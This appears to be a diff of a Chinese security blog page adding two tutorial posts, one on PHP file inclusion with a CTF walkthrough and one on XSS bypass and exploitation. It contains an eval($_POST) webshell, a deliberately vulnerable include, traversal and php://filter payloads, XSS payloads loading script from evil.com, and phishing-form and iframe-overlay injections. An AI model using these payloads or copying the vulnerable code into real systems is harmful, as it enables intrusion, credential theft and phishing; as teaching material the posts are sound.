@@ -258,6 +258,1064 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/26/文件包含漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/26/文件包含漏洞/" itemprop="url">
+                  文件包含漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-26T20:33:04+08:00">
+                2018-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/26/文件包含漏洞/" class="leancloud_visitors" data-flag-title="文件包含漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-文件包含漏洞"><a href="#0x00-文件包含漏洞" class="headerlink" title="0x00 文件包含漏洞"></a>0x00 文件包含漏洞</h2><p>PHP文件包含漏洞，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。</p>
+<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>文件包含漏洞主要是程序员把一些公用的代码写在一个单独的文件中，然后使用其他文件进行包含调用，如果需要包含的文件使用硬编码，一般是不会出现安全问题，但是有时可能不确定需要包含哪些具体文件，所以就会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，导致外部提交的恶意数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。  </p>
+<p>文件包含通常分为本地文件包含(Local File Inclusion)和远程文件包含(Remote File Inclusion)。allow_url_fopen和 allow_url_include为0n的情况认为是远程文件包含漏洞，allow_url_fopen为off和 allow_url_include为0n为本地文件包含漏洞。</p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先我们在wamp环境创建如下文件：</p>
+<p>index.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if($_GET[p])&#123;</span><br><span class="line">	include $_GET[p];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	include &quot;home.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>home.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;home&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>123.txt:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;123&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问index.php，出现home。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include01.png" alt=""></p>
+<p>访问index.php?p=123.txt,出现123，则环境搭建完成。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include02.png" alt=""></p>
+<h2 id="0x03-本地文件包含"><a href="#0x03-本地文件包含" class="headerlink" title="0x03 本地文件包含"></a>0x03 本地文件包含</h2><p>我们先尝试本地文件包含漏洞，即获取的文件在搭载漏洞网站的服务器上，我们可以先尝试在桌面创建一个test.txt，写入如下内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后通过file协议访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，发现显示test，说明可以apache服务器的权限很高，可以访问其他盘符位置，这样就可以遍历整个机器读取其中的敏感信息。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include03.png" alt=""></p>
+<p>如果将test.txt中的内容换成一句话木马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval ($_POST[&apos;leticia&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后重新访问index.php?p=file:///C:/Users/Leticia/Desktop/test.txt，用菜刀连接一句话木马，发现可以获取整个计算机的读写权限。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include04.png" alt=""></p>
+<h2 id="0x04-远程文件包含"><a href="#0x04-远程文件包含" class="headerlink" title="0x04 远程文件包含"></a>0x04 远程文件包含</h2><p>我们再尝试远程文件包含，上面已经说过，要使allow_url_fopen和 allow_url_include为0n，所以远程文件包含非常少见，我们为了测试漏洞，就先打开wamp安装路径下的php.ini文件，将这两条改为ON。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include05.png" alt=""></p>
+<p>然后我们在虚拟机上新建一个文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;ok&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>在虚拟机打开一个http server，然后访问index.php?p=<a href="http://192.168.31.203:8000/2.txt" target="_blank" rel="noopener">http://192.168.31.203:8000/2.txt</a></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include06.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include07.png" alt=""></p>
+<p>如果把2.txt文件改成一句话木马，即可用菜刀连接。</p>
+<h2 id="0x05-利用方法"><a href="#0x05-利用方法" class="headerlink" title="0x05 利用方法"></a>0x05 利用方法</h2><p>文件包含漏洞有很多利用方式：</p>
+<h4 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h4><p>如../../../../../etc/passwd来读取敏感文件。</p>
+<h4 id="2、包含shell"><a href="#2、包含shell" class="headerlink" title="2、包含shell"></a>2、包含shell</h4><p>如有其他漏洞将shell写入目标服务器中，或者可以远程包含自己服务器的shell，就可以通过包含shell文件来通过目标服务器apache来执行shell，用来提权之类的操作。</p>
+<h4 id="3、配合文件上传漏洞"><a href="#3、配合文件上传漏洞" class="headerlink" title="3、配合文件上传漏洞"></a>3、配合文件上传漏洞</h4><p>如果上传的木马文件所在的路径不可以通过外网访问，但是可以通过文件包含漏洞读取，那么就可以构造参数将该文件运行，就可以得到webshell。</p>
+<h4 id="4、使用PHP封装协议读取文件和写入PHP文件"><a href="#4、使用PHP封装协议读取文件和写入PHP文件" class="headerlink" title="4、使用PHP封装协议读取文件和写入PHP文件"></a>4、使用PHP封装协议读取文件和写入PHP文件</h4><p>读取文件，可以通过输入page参数值如下：php://filter/read=convert.base64-encode/resource=../../../../../var/www/html/upload/xxx.txt来读取并执行。</p>
+<p>写入文件，可以通过传入page=php://input，然后post提交我们要输入的内容。</p>
+<h2 id="0x06-一个ctf例子"><a href="#0x06-一个ctf例子" class="headerlink" title="0x06 一个ctf例子"></a>0x06 一个ctf例子</h2><p>我们可以用一个ctf的例子来看看实际中怎么利用。</p>
+<p>是iscc的一道web题</p>
+<p>目标网址是一张图片 <a href="http://118.190.152.202:8006/" target="_blank" rel="noopener">http://118.190.152.202:8006/</a></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include08.png" alt=""></p>
+<p>源码中只有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;show.php?img=1.jpg&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后我们点开 <a href="http://118.190.152.202:8006/show.php?img=1.jpg" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=1.jpg</a></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include09.png" alt=""></p>
+<p>看到这个img参数，很容易想到文件包含漏洞</p>
+<p>然后访问 <a href="http://118.190.152.202:8006/show.php?img=file:///show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=file:///show.php</a> 尝试访问本页面源码<br>发现file not find</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include10.png" alt=""></p>
+<p>但是我们知道php://filter可以指定两个resource，这个时候构造<br><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php</a></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include11.png" alt=""></p>
+<p>然后查看源代码就可以看本页面代码了，接下来根据源码读取flag.php，查看源码，就完成了 <a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php" target="_blank" rel="noopener">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php</a></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include12.png" alt=""></p>
+<h2 id="0x07-应对"><a href="#0x07-应对" class="headerlink" title="0x07 应对"></a>0x07 应对</h2><ul>
+<li><p>1.判断包含中的参数是否外部可控。</p>
+</li>
+<li><p>2.限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。</p>
+</li>
+<li><p>3.验证被包含的文件是否在白名单中。</p>
+</li>
+<li><p>4.尽量不要使用变量，如要使用包含，直接规定好包含的文件名，如：“include(“head.php”)”。</p>
+</li>
+<li><p>5.可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p>
+</li>
+<li><p>6.如非必要，不要打开远程文件包含。 </p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/24/XSS绕过和利用方式总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/04/24/XSS绕过和利用方式总结/" itemprop="url">
+                  XSS绕过和利用方式总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-24T22:02:17+08:00">
+                2018-04-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/24/XSS绕过和利用方式总结/" class="leancloud_visitors" data-flag-title="XSS绕过和利用方式总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p>
+<h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p>
+<ul>
+<li>1 大小写混用</li>
+</ul>
+<p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;AleRt(&apos;xss&apos;)&lt;/ScRipt&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>2 利用HTML标签属性值执行</li>
+</ul>
+<p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;jacascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>3 回车空格等</li>
+</ul>
+<p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>或者换行输入用分号分隔：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas</span><br><span class="line">cript:</span><br><span class="line">alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>4 对标签属性进行转码</li>
+</ul>
+<p>普通的标签属性值过滤还可以通过编码绕过，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以写成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&gt;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>5 自己构造事件</li>
+</ul>
+<p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;#&quot; onerror=alert(&apos;xss&apos;) &gt;</span><br></pre></td></tr></table></figure></p>
+<p>图片地址不存在，加载失败的时候就会运行后面的脚本</p>
+<p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p>
+<ul>
+<li>6 注释过滤</li>
+</ul>
+<p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;xss:expr/*xss*/ession(alert(&apos;xss&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>7 拆分跨站</li>
+</ul>
+<p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&apos;&lt;script src=http://www.evil.com/hack.js&gt;&lt;/script&gt;&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>但是输入框限制每次只能输入30个字符时，我们可以：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;src=htt&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;p://www&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.evil.c&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;om/hack&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;.js&gt;&lt;/s&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;cript&gt;&quot;&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;eval(z)&apos;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p>
+<h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p>
+<h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p>
+<ul>
+<li>xss重定向钓鱼</li>
+</ul>
+<p>我们在一个网页找到了xss漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
+<p>构造如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=&lt;script&gt;document.location.href=&quot;http://www.hack.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>就可以通过xss重定向，将网页跳转到<a href="http://www.hack.com" target="_blank" rel="noopener">www.hack.com</a></p>
+<ul>
+<li>HTML注入式钓鱼</li>
+</ul>
+<p>仍然假设有如下漏洞页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.123.com/index.php?input=[Expliot]</span><br></pre></td></tr></table></figure></p>
+<p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.hack.com/index.php?input=&quot;&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form</span><br><span class="line">Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt;</span><br><span class="line">&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p>
+<ul>
+<li>iframe钓鱼</li>
+</ul>
+<p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;body&#123;</span><br><span class="line">      margin:0px;</span><br><span class="line">	  border:0px;</span><br><span class="line">	  padding:0px;</span><br><span class="line">  &#125;</span><br><span class="line">iframe&#123;border:0px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=&quot;http://www.baidu.com/&quot; id=&quot;iframepage&quot; name=&quot;iframepage&quot;  width=&quot;100%&quot; height=&quot;100%&quot; &gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这样我们可以用百度页面覆盖整个网页。</p>
+<p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的<a href="http://www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中" target="_blank" rel="noopener">www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;body&#123;margin:0px;border:0px;padding:0px;&#125;</span><br><span class="line">iframe&#123;border:0px;&#125;</span><br><span class="line">&lt;iframe src=&quot;http://www.hack.com/&quot;width=&quot;100%&quot; height=&quot;100%&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
+<p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p>
+<h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt; script &gt;</span><br><span class="line">var websites = [要检测的访问过的网址列表（自己补充）];</span><br><span class="line">//遍历每个URL</span><br><span class="line">for (var i = 0; i &lt; websites.length: i++) &#123;</span><br><span class="line">    var link = document.createElement(&quot;a&quot;);</span><br><span class="line">    link.id = &quot;id&quot; + i;</span><br><span class="line">    link.href = websites[i];</span><br><span class="line">    link.innerHTML = websites[i];</span><br><span class="line">    document.write(&apos;&lt;style&gt;&apos;);</span><br><span class="line">    document.write(&apos;#id&apos; + i + &quot;:visited &#123;color:#FF0000;&#125;&quot;);</span><br><span class="line">    document.write(&apos;&lt;/style&gt;&apos;);</span><br><span class="line">    document.body.appendChild(link);</span><br><span class="line">    var color = document.defaultView.getComputedStyle(link, null).getPropertyValue(&quot;color&quot;);</span><br><span class="line">    document.body.removeChild(link);</span><br><span class="line">    if (color == &quot;rgb(255,0,0)&quot;) &#123; //visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;visited&apos;).appendChild(item);</span><br><span class="line">    &#125; else &#123; //Not visited</span><br><span class="line">        var item = document.createElement(&apos;li&apos;);</span><br><span class="line">        item.appendChild(link);</span><br><span class="line">        document.getElementById(&apos;notvisited&apos;).appendChild(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; &lt; /script&gt;/</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p>
+<h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
